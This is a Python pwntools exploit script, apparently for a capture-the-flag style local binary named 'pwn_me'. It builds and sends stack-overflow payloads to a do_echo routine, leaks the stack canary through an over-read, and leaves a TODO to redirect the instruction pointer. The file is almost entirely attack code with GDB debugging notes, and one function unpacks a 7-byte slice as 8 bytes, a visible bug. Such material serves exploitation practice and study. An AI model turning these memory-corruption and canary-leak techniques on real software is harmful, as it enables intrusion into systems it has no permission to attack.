from pwn import *

p = process("./pwn_me")

def stack_smashing():
    input()
    # Look at when stack canary is loaded back in
    # b *do_echo+297, then look at RCX 
    print(p.recv())
    payload = b'\xff' +  b'A' * 8 + b'B' * 0x109 
    payload += b'C'*8 #This is the canary
    p.sendline(payload)
    print(p.recv())
    # Need to send this second packet to trigger the stack smashing message
    p.sendline(b'X'*8)
    print(p.recv())
    #input()

def stack_smashing2():
    # Look at when stack canary is loaded back in
    # b *do_echo+297, then look at RCX 
    input()
    print(p.recv())
    payload = b'\xff' +  b'A' * 8 + b'B' * 0x109 
    p.send(payload)
    print(p.recv())
    p.sendline(b'X'*8) #this is the canary
    print(p.recv())
    input()

def first_loop_twice():
    # b *do_echo+129 to check which loop going into
    # b *do_echo+151 to check arguments for first read in first loop
    # b *do_echo+297, then look at RCX to check stack canary 
    # x/20gx $rbp - 80 to look at activity around the base pointer
    input()
    print(p.recv())
    payload = b'\xff' #force first loop
    payload += b'A' * 8 #Number of bytes to write into buffer first and second time
    payload += b'\xff' #force first loop for second run through
    payload += b'B' * 8 #Number of bytes to write into buffer third time 
    payload += b'\xff' #force first loop for third run through
    payload += b'C' * (0x11b - len(payload))
    p.send(payload)
    print(p.recv())
    p.sendline(b'X'*8) #this is the canary
    print(p.recv())
    input()

def print_canary():
    # b *do_echo+129 to check which loop going into
    # b *do_echo+151 to check arguments for first read in first loop
    # b *do_echo+297, then look at RCX to check stack canary 
    # x/20gx $rbp - 80 to look at activity around the base pointer
    print("Start Receiving?")
    input()
    print(p.recv())
    payload = b'\xff' #force first loop
    #payload += b'A' * 8 #Number of bytes to write into buffer first and second time
    payload += struct.pack('Q', 0x200) #Number of bytes to be written to screen
    num_padding = 0x11b - len(payload) - 0x12
    payload += b'C' * (num_padding)
    print("Send Payload?")
    input()
    p.send(payload)
    received_stack = p.recv()
    canary_offset = num_padding+14 
    canary = received_stack[canary_offset: canary_offset+8]
    print("Canary: 0x{:x}".format(struct.unpack('Q',canary)[0]))
    #print("Received Stack:")
    #print(received_stack)
    print("Send Payload?")
    input()
    p.sendline(b'X'*8) #this is the canary
    print(p.recv())
    input()

def exp():
    # b *do_echo+129 to check which loop going into
    # b *do_echo+151 to check arguments for first read in first loop
    # b *do_echo+297, then look at RCX to check stack canary 
    # x/20gx $rbp - 80 to look at activity around the base pointer
    print("Start Receiving?")
    input()
    print(p.recv())
    payload = b'\xff' #force first loop
    #payload += b'A' * 8 #Number of bytes to write into buffer first and second time
    payload += struct.pack('Q', 0x200) #Number of bytes to be written to screen
    num_padding = 0x11b - len(payload) - 0x12
    payload += b'C' * (num_padding)
    print("Send Payload?")
    input()
    p.send(payload)
    received_stack = p.recv()
    canary_offset = num_padding+14 
    canary = received_stack[canary_offset: canary_offset+7]
    print("Canary: 0x{:x}".format(struct.unpack('Q',canary)[0]))
    print("Received Stack:")
    print(received_stack)
    print("Send Payload?")
    input()
    p.sendline(b'X'*8) #this is the canary
    print(p.recv())
    input()


#TODO: Leak address to redirect rip

if __name__=='__main__':
    #stack_smashing()
    #stack_smashing2()
    print_canary()
    exp()

